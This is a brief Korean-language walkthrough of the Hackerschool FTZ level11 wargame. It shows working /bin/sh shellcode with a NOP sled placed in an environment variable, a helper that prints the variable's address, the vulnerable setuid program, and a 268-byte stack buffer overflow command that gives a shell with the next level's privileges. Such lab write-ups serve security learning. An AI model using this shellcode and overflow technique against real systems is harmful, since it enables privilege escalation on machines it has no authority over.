Hackerschool FTZ level11
===
1. EGG라는 환경변수를 만들고 nop썰매와 bin/sh를 16진수로 바꾼
 > \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80 
 
 를 저장한다
 >export EGG=` python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" '
>>\x90은 nop명령어
 2. 그 EGG의 주소 구함
 ~~~c
#include<stdio.h>
#include<stdlib.h>

int main(int argc, char* argv[]){
        printf("%p\n",getenv(argv[1]));
        return 0;
}
 ~~~

3.attackme에 버퍼오버플로우를 내고 nop썰매 안에 있을 
EGG의 주소를 넣음  
~~~c
int main( int argc, char *argv[] )
{
        char str[256];

        setreuid( 3092, 3092 );
        strcpy( str, argv[1] );
        printf( str );
}
~~~
gdb 를하면 str 할당할때 256바이트를 할당해야하는데 esp(=sfp)를 264바이트를 내려 
8바이트의 dommy가 생기고 그다음 sfp는 4바이트 다음 RET가있으므로 

268바이트의 패딩이 필요
> ./attackme 
'
 python -c 'print "A"*268+\x3f\xfc\xff\xbf"'`   
>>이번경우 "\x3f\xfc\xff\xbf" 가 주소였음 

아무튼 실행하면 다음 level권한이있는 sh에 
들어가져
my-pass를 치면 된다.